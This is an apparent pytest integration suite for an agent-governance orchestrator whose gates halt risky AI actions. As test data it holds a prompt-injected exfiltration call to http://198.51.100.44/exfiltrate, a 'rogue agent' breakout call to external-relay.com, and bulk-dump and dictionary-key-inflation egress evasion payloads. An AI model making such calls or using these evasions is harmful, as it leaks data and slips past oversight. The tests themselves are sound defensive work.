"""
Integration test suite for the EpistemicOrchestrator unified pipeline.

Validates:
1. Adversarial breakout prevention (ADV-CTF-004)
2. Downstream Scope Locking & RMM Subnet Quarantine
3. EntropyAwareScheduler gamma sweeps and noisy payload handling
4. Tamper-evident audit trail integrity
5. Server-side stateful attempt tracking and retry limits
6. Lateral breakout prevention (Rogue Agent Scenario)
"""

import json
from pathlib import Path
from typing import Dict, Any, List
import pytest

from epistemicos.core import EpistemicOrchestrator
from epistemicos.models import CanonicalProblemRepresentation, PermissionScope
from epistemicos.gates import GateAction, CryptoAttestationGate, EntropyGate, PermissionGate
from epistemicos.audit import TamperEvidentAuditTrail, AuditLogLevel


# =====================================================================
# FIXTURES
# =====================================================================

@pytest.fixture
def orchestrator():
    return EpistemicOrchestrator()

@pytest.fixture
def base_spoof_payload():
    return {
        "policy_id": "POL-SPOOF-TEST",
        "fleet_data": {"vehicle_count": 10, "operating_radius_miles": 100.0},
        "scope": {
            "max_attempts": 3,
            "origin_subnet": "192.168.1.10",
            "allowed_resources": ["logistics_db"],
            "allowed_operations": ["read", "update_db"]
        }
    }


# =====================================================================
# PART 1: ADV-CTF-004 & DOWNSTREAM SCOPE LOCKS
# =====================================================================

def test_ctf_sandbox_breakout_blocked():
    """
    Validates ADV-CTF-004: Ensures prompt-injected exfiltration attempts to external IPs
    trigger both EntropyGate and PermissionGate vetoes, resulting in a HALTED/ROLLED_BACK receipt.
    """
    orchestrator = EpistemicOrchestrator()

    mock_payload = {
        "policy_id": "POL-2026-CTF",
        "primary_metric": 0.0,
        "risk_details": {"sandbox_escape": "Attempting external connectback"}
    }

    context = {
        "token_count": 9,
        # High surprisal logprob trace simulating adversarial model rationalization
        "token_logprobs": [-0.01, -0.05, -12.4, -14.2, -10.5, -9.8, -13.1, -15.5, -0.01],
        "proposed_actions": [
            {
                "op": "api_call",
                "endpoint": "http://198.51.100.44/exfiltrate",
                "data": "flag_data"
            }
        ]
    }

    result = orchestrator.process_submission(mock_payload, context)

    assert result["status"] == "HALTED"
    assert result["gate"] in ("EntropyGate", "PermissionGate")


def test_internal_subnet_mutating_action_permitted():
    """
    Validates that state-mutating requests ('update_db') originating from
    trusted internal subnets pass scope checks and commit successfully.
    """
    orchestrator = EpistemicOrchestrator()

    scope = PermissionScope(
        origin_subnet="192.168.1.50",
        is_rmm_origin=False,
        allowed_resources=["logistics_db"],
        allowed_operations=["read", "query", "update_db"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-101-VA",
        fleet_data={"vehicle_count": 10},
        scope=scope
    )

    context = {
        "token_count": 2,
        "token_logprobs": [-0.02, -0.02],
        "proposed_actions": [
            {"op": "update_db", "node": "logistics_db"}
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)
    assert result["status"] == "ALLOWED"


def test_rmm_quarantine_subnet_mutating_action_blocked():
    """
    Validates that state-mutating requests ('update_db') originating from
    an RMM quarantine subnet trigger Downstream Scope Lock and halt execution.
    """
    orchestrator = EpistemicOrchestrator()

    scope = PermissionScope(
        origin_subnet="10.240.1.100",
        is_rmm_origin=True,
        allowed_resources=["logistics_db"],
        allowed_operations=["read", "query", "update_db"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-101-VA",
        fleet_data={"vehicle_count": 10},
        scope=scope
    )

    context = {
        "token_count": 2,
        "token_logprobs": [-0.02, -0.02],
        "proposed_actions": [
            {"op": "update_db", "node": "logistics_db"}
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)
    assert result["status"] == "HALTED"
    assert result["gate"] == "PermissionGate"


def test_rmm_quarantine_subnet_read_only_permitted():
    """
    Validates that read-only diagnostic requests ('read') originating from
    an RMM quarantine subnet remain permitted under the degraded privilege profile.
    """
    orchestrator = EpistemicOrchestrator()

    scope = PermissionScope(
        origin_subnet="10.240.1.100",
        is_rmm_origin=True,
        allowed_resources=["logistics_db"],
        allowed_operations=["read", "query", "update_db"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-101-VA",
        fleet_data={"vehicle_count": 10},
        scope=scope
    )

    context = {
        "token_count": 2,
        "token_logprobs": [-0.02, -0.02],
        "proposed_actions": [
            {"op": "read", "node": "logistics_db"}
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)
    assert result["status"] == "ALLOWED"


# =====================================================================
# PART 2: NOISY PAYLOADS, ENTROPY SCHEDULING, & AUDIT INTEGRITY
# =====================================================================

def test_orchestrator_noisy_surprisal_halt_and_rollback():
    """
    Validates that high logprob surprisal triggers EntropyGate veto
    and stops execution safely within the unified orchestrator.
    """
    orchestrator = EpistemicOrchestrator()

    mock_commercial_payload = {
        "policy_id": "POL-2026-N99",
        "fleet_data": {
            "vehicle_count": 85,
            "operating_radius_miles": 1200.0,
            "loss_modifier": 1.45,
            "hazard_class": "severe",
            "garaging_states": ["TX", "CA", "AZ"]
        }
    }

    # Deterministic baseline logprobs followed by extreme noise spike
    deterministic_baseline = [-0.05] * 20
    noisy_logprobs = deterministic_baseline + [-12.5, -15.0, -11.8]

    context = {
        "token_count": len(noisy_logprobs),
        "token_logprobs": noisy_logprobs,
        "proposed_actions": [
            {"op": "update_db", "node": "logistics_db"},
            {"op": "issue_binder", "policy": "POL-2026-N99"}
        ]
    }

    result = orchestrator.process_submission(mock_commercial_payload, context)

    assert result["status"] == "HALTED"
    assert result["gate"] == "EntropyGate"


def test_orchestrator_clean_logprobs_committed():
    """Validates that nominal logprobs without surprisal spikes commit successfully."""
    orchestrator = EpistemicOrchestrator()

    mock_commercial_payload = {
        "policy_id": "POL-2026-N99",
        "fleet_data": {
            "vehicle_count": 85,
            "operating_radius_miles": 1200.0,
            "loss_modifier": 1.45,
            "hazard_class": "severe",
            "garaging_states": ["TX", "CA", "AZ"]
        }
    }

    clean_logprobs = [-0.02] * 25
    context = {
        "token_count": len(clean_logprobs),
        "token_logprobs": clean_logprobs
    }

    result = orchestrator.process_submission(mock_commercial_payload, context)
    assert result["status"] == "ALLOWED"


def test_optimal_gamma_audit_payload(tmp_path):
    """
    Verifies that tamper-evident audit logs record events accurately across execution steps.
    """
    log_file = tmp_path / "test_audit.jsonl"
    audit_logger = TamperEvidentAuditTrail(str(log_file))

    audit_logger.record_event(
        event_type=AuditLogLevel.INFO,
        gate_name="EntropyAwareScheduler",
        reason="Step passed entropy evaluation",
        model_id="mock-llm-v1",
        payload_snippet="Step 0 distribution"
    )

    audit_logger.record_event(
        event_type=AuditLogLevel.HALT,
        gate_name="EntropyAwareScheduler",
        reason="Cumulative entropy shock exceeded gamma threshold",
        model_id="mock-llm-v1",
        payload_snippet="Step 2 distribution",
        metadata={"gamma": 0.80, "drop_bits": 0.9165}
    )

    is_valid, count, error = audit_logger.verify_chain_integrity()
    assert is_valid is True
    assert count == 2
    assert error is None


# =====================================================================
# PART 3: STATEFUL TRACKING & LATERAL BREAKOUT
# =====================================================================

def test_spoofed_client_attempt_counter_neutralized(orchestrator, base_spoof_payload):
    clean_logprobs = [-0.01] * 10
    noisy_logprobs = [-0.01] * 5 + [-12.0]

    actions = [{"op": "update_db", "node": "logistics_db"}]
    context_clean = {"token_count": 10, "token_logprobs": clean_logprobs, "proposed_actions": actions}
    context_noisy = {"token_count": 6, "token_logprobs": noisy_logprobs, "proposed_actions": actions}

    session_id = "TRACKED-SESSION-001"

    # Attempt 1: Clean run -> Allowed
    res1 = orchestrator.process_submission(base_spoof_payload, context_clean, trajectory_id=session_id)
    assert res1["status"] == "ALLOWED"

    # Attempt 2: Noisy run -> Fails EntropyGate, recorded as server-side attempt 2
    res2 = orchestrator.process_submission(base_spoof_payload, context_noisy, trajectory_id=session_id)
    assert res2["status"] == "HALTED"

    # Attempt 3: Noisy run -> Fails EntropyGate, recorded as server-side attempt 3
    res3 = orchestrator.process_submission(base_spoof_payload, context_noisy, trajectory_id=session_id)
    assert res3["status"] == "HALTED"

    # Attempt 4: Exceeds max_attempts (4 > 3) -> Server halts immediately due to retry exhaustion
    breached_payload = base_spoof_payload.copy()
    breached_payload["scope"] = {
        "attempt_count": 4,
        "max_attempts": 3,
        "allowed_resources": ["logistics_db"],
        "allowed_operations": ["read", "update_db"]
    }

    res4 = orchestrator.process_submission(breached_payload, context_clean, trajectory_id=session_id)
    assert res4["status"] == "HALTED"


def test_lateral_breakout_blocked_by_permission_gate():
    """
    Validates that a rogue agent attempting external web search breakout is
    blocked by PermissionGate even when token logprobs are extremely high/stable.
    """
    orchestrator = EpistemicOrchestrator()

    # Define standard permission scope restricted to internal operations
    scope = PermissionScope(
        origin_subnet="192.168.1.10",
        allowed_resources=["underwrite_service"],
        allowed_operations=["underwrite", "issue_binder", "cancel_policy"]
    )

    cpr = CanonicalProblemRepresentation(
        policy_id="POL-2026-ROGUE",
        fleet_data={
            "vehicle_count": 150,
            "operating_radius_miles": 2000.0,
            "loss_modifier": 2.5,
            "hazard_class": "severe"
        },
        scope=scope
    )

    # Agent attempts lateral breakout to an unauthorized external search endpoint
    context = {
        "token_count": 8,
        # High-confidence, low-entropy logprob trace (simulating clean agent execution)
        "token_logprobs": [-0.02, -0.01, -0.03, -0.02, -0.01, -0.02, -0.04, -0.01],
        "proposed_actions": [
            {
                "op": "web_search",
                "endpoint": "https://external-relay.com/api/search",
                "data": "override strict logistics underwriting decline parameters"
            }
        ]
    }

    result = orchestrator.process_submission(cpr.model_dump(), context)

    assert result["status"] == "HALTED"
    assert result["gate"] == "PermissionGate"


# =====================================================================
# PART 4: ENTERPRISE DLT & TRANSACTIONAL COMPLIANCE (GDPR / CCPA)
# =====================================================================

from epistemicos.compliance import (
    TransactionalComplianceBroker,
    OffChainStoreAdapter,
    ImmutableLedgerAdapter
)


@pytest.fixture
def compliance_broker():
    return TransactionalComplianceBroker(
        offchain_store=OffChainStoreAdapter(),
        ledger=ImmutableLedgerAdapter()
    )


def test_atomic_transaction_record_and_hash_verification(compliance_broker):
    """Validates off-chain storage, payload hashing, and ledger block commitment."""
    tx_id = "TX-2026-8819"
    payload = {"client_name": "Jane Doe", "ssn": "000-00-0000", "policy_limit": 1000000}
    receipt = {"status": "COMMITTED", "gate": "EntropyGate", "halt_directive": "NONE"}

    block = compliance_broker.record_transaction(tx_id, payload, receipt)

    # 1. Verify ledger hash matches independently computed hash
    expected_hash = compliance_broker.compute_canonical_hash(payload)
    assert block["payload_hash"] == expected_hash
    assert block["transaction_id"] == tx_id

    # 2. Verify off-chain store holds raw payload
    stored_payload = compliance_broker.offchain_store.get(tx_id)
    assert stored_payload == payload


def test_right_to_be_forgotten_gdpr_purge(compliance_broker):
    """
    Validates GDPR Article 17 compliance:
    Raw PII is completely deleted from off-chain DB, but ledger proof remains intact.
    """
    tx_id = "TX-2026-9901"
    payload = {"email": "user@example.com", "address": "123 Main St"}
    receipt = {"status": "HALTED", "gate": "EntropyGate"}

    # Anchor transaction
    block = compliance_broker.record_transaction(tx_id, payload, receipt)
    anchored_hash = block["payload_hash"]

    # Execute PII Purge
    deleted, preserved_hash = compliance_broker.execute_right_to_be_forgotten(tx_id)

    assert deleted is True
    assert preserved_hash == anchored_hash

    # Raw PII must be gone
    assert compliance_broker.offchain_store.get(tx_id) is None

    # Immutable ledger block must still exist
    ledger_block = compliance_broker.ledger.get_block(tx_id)
    assert ledger_block is not None
    assert ledger_block["payload_hash"] == anchored_hash


# =====================================================================
# PART 5: SAAS EGRESS GOVERNOR & CRYPTO ATTESTATION (ML-DSA)
# =====================================================================

def test_saas_egress_governor_row_limits_and_dict_evasion():
    """
    Validates that PermissionScope egress boundaries enforce row limits and block
    both array-based bulk dumps and dictionary key inflation evasion techniques.
    """
    scope = PermissionScope(
        origin_subnet="192.168.1.10",
        allowed_resources=["salesforce_api"],
        allowed_operations=["query"],
        max_row_count=50,
        max_payload_bytes=10_000_000
    )

    # 1. Safe payload (5 records <= 50 max)
    safe_salesforce_payload = {
        "query": "SELECT Id, Name FROM Policy__c WHERE Region = 'VA'",
        "records": [{"id": f"POL-{i}", "name": f"Regional Freight {i}"} for i in range(5)],
        "totalSize": 5
    }
    assert scope.validate_egress(safe_salesforce_payload) is True

    # 2. Mass exfiltration payload via array (15,000 records > 50 max)
    malicious_list_payload = {
        "query": "SELECT * FROM Account",
        "records": [{"id": f"ACT-{i}", "name": "Bulk Dump"} for i in range(15000)],
        "totalSize": 15000
    }
    assert scope.validate_egress(malicious_list_payload) is False

    # 3. Evasion payload using dictionary key inflation (60 keys > 50 max)
    malicious_dict_evasion_payload = {
        f"ACT-{i}": {"name": "Bulk Dump", "status": "Active"} for i in range(60)
    }
    assert scope.validate_egress(malicious_dict_evasion_payload) is False


def test_crypto_attestation_gate_pqc_verification():
    """
    Validates that requests lacking valid ML-DSA (Post-Quantum Cryptography)
    attestation signatures or using expired algorithms are halted at the perimeter.
    """
    orchestrator = EpistemicOrchestrator()
    orchestrator.register_gate(CryptoAttestationGate(required_algorithm="ML-DSA", expiry_year=2030))

    payload = {"policy_id": "POL-PQC-2026", "action": "issue_binder"}
    context = {"token_count": 5, "token_logprobs": [-0.01] * 5}

    # Case A: Missing/Invalid Cryptography Metadata -> Halted
    invalid_crypto_context = {
        **context,
        "cryptography": {"algorithm": "RSA-2048", "signature": "legacy_sig"}
    }
    result_invalid = orchestrator.process_submission(payload, invalid_crypto_context)
    assert result_invalid["status"] == "HALTED"
    assert result_invalid["gate"] == "CryptoAttestationGate"

    # Case B: Valid ML-DSA Attestation -> Allowed
    valid_crypto_context = {
        **context,
        "cryptography": {
            "algorithm": "ML-DSA",
            "signature": "valid_mldsa_attestation_proof",
            "expiry_year": 2028
        }
    }
    result_valid = orchestrator.process_submission(payload, valid_crypto_context)
    assert result_valid["status"] == "ALLOWED"


def test_governance_os_stateful_key_revocation():
    """
    Validates stateful revocation of compromised PQC keys within the EpistemicOrchestrator.
    - Scenario 1: Valid PQC Key -> ALLOWED receipt generated.
    - Scenario 2: Compromised PQC Key -> HALTED / ROLLED_BACK receipt generated.
    """
    priors = {"preferred": 0.5, "standard": 0.3, "substandard": 0.2}
    orchestrator = EpistemicOrchestrator(prior_probabilities=priors)

    orchestrator.register_gate(EntropyGate(z_threshold=2.85))
    orchestrator.register_gate(PermissionGate(contract_model=CanonicalProblemRepresentation))
    orchestrator.register_gate(CryptoAttestationGate(required_algorithm="ML-DSA", expiry_year=2030))

    mock_payload = {
        "policy_id": "POL-2026-QUANTUM",
        "fleet_data": {"vehicle_count": 85, "operating_radius_miles": 1200.0, "hazard_class": "standard"}
    }
    proposed_actions = [
        {"op": "update_db", "node": "logistics_db", "status": "bound"},
        {"op": "revert", "node": "logistics_db", "status": "pending"}
    ]
    mock_likelihoods = {"preferred": 0.80, "standard": 0.15, "substandard": 0.05}
    safe_logprobs = [-0.02] * 15

    # Scenario 1: Valid PQC Key -> ALLOWED
    valid_crypto_meta = {"algorithm": "ML-DSA", "key_id": "KEY-123-SECURE"}
    valid_context = {
        "likelihoods": mock_likelihoods,
        "token_logprobs": safe_logprobs,
        "proposed_actions": proposed_actions,
        "cryptography": valid_crypto_meta 
    }
    valid_result = orchestrator.process_submission(
        raw_payload=mock_payload,
        context=valid_context
    )
    assert valid_result["status"] == "ALLOWED"
    assert "trajectory_id" in valid_result

    # Scenario 2: Compromised PQC Key -> HALTED (Stateful Revocation)
    compromised_crypto_meta = {"algorithm": "ML-DSA", "key_id": "KEY-000-COMPROMISED"}
    compromised_context = {
        "likelihoods": mock_likelihoods,
        "token_logprobs": safe_logprobs,
        "proposed_actions": proposed_actions,
        "cryptography": compromised_crypto_meta
    }
    compromised_result = orchestrator.process_submission(
        raw_payload=mock_payload,
        context=compromised_context
    )
    assert compromised_result["status"] == "HALTED"
    assert compromised_result["gate"] == "CryptoAttestationGate"


# =====================================================================
# DLT PIPELINE & GDPR RIGHT-TO-BE-FORGOTTEN INTEGRATION
# =====================================================================

def test_full_dlt_pipeline_and_gdpr_deletion():
    """
    Validates end-to-end hot-path transaction processing, cold-path DLT logging,
    and off-chain GDPR Right-to-be-Forgotten deletion compliance.
    """
    priors = {"preferred": 0.5, "standard": 0.3, "substandard": 0.2}
    orchestrator = EpistemicOrchestrator(prior_probabilities=priors)
